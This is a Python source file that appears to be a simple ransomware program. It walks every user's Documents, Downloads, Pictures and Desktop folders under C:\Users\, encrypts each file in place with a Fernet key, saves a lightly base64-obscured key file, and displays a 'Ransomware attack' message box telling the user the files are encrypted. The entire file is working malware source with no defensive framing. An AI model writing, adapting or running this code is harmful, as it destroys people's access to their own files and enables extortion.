import os, ctypes, base64, time
from cryptography.fernet import Fernet

files_ar = []  # array for all files in folder
no_encrypt = ["encrypt.py", "decrypt.py", "key.key", "encrypt.exe", "decrypt.exe"]
count_files = 0
rootdir = "C:\\Users\\"
exclude = ["All Users", "Default", "Default User", "desktop.ini", "Public", "niels"]
standard_folders = ["Documents", "Downloads", "Pictures", "Desktop"]
folders = []
for folder in os.listdir(rootdir):
    if folder in exclude: continue
    else: folders.append(folder)

for folder in folders:  # opens user folder
    for all_user_folders in os.listdir(rootdir + folder):  # reads all folders within user folder
        if all_user_folders not in standard_folders: continue  # if folder is not standard, don't touch, skip
        else:
            for root, dirs, files in os.walk(rootdir+folder+"\\"+all_user_folders):
                for file in files:
                    file2 = os.path.join(root, file)
                    if file in no_encrypt: continue  # skip these files
                    if os.path.isfile(file2):  # if file add to array
                        files_ar.append(file2)
                        count_files = count_files + 1

key = Fernet.generate_key()  # generate key
for file in files_ar:  # encrypt every file within "files" array
    with open(file, "rb")as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    bas_encrypted = base64.b64encode(contents_encrypted)
    with open(file, "wb") as thefile:
        thefile.write(bas_encrypted)

print(key)
# encrypt key 5 times with base64 before save
i = 1
while i <= 5:
    key = base64.b64encode(key)
    i = i + 1
with open("key.key", "wb") as keyfile:
    keyfile.write(key)

# test
print(files_ar, "\n", key)
print(folders)

time.sleep(3)

ctypes.windll.user32.MessageBoxW(None, "All your files have been encrypted, \n if you want your files back run the "
                                       "decrypt program, if you dare.", "Ransomware attack", 0)
